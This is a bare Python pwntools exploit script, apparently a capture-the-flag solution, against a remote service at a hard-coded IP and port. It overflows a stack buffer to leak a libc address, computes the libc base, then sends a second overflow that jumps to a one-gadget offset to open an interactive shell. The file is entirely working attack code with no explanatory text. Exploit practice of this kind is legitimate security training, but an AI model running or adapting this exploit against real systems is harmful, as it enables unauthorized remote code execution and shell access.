from pwn import *
#context.log_level = "debug"
main = 0x4006ce
__libc_csu_init = 0x400720
pop_r15_ret=0x40077a
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

#0x6f1
p = remote("34.92.37.22",10000)
print p.recvuntil("pwn!\n")
payload = 'A'*0x28+p64(0x4006f1)
p.sendline(payload)
p.recv(0xd0)
libc.address=u64(p.recv(6)+'\x00\x00')-0x5f1168
success("libc.address-->"+hex(libc.address))
payload = "A"*0x28+p64(libc.address+0x45216)
p.sendline(payload)
p.interactive()
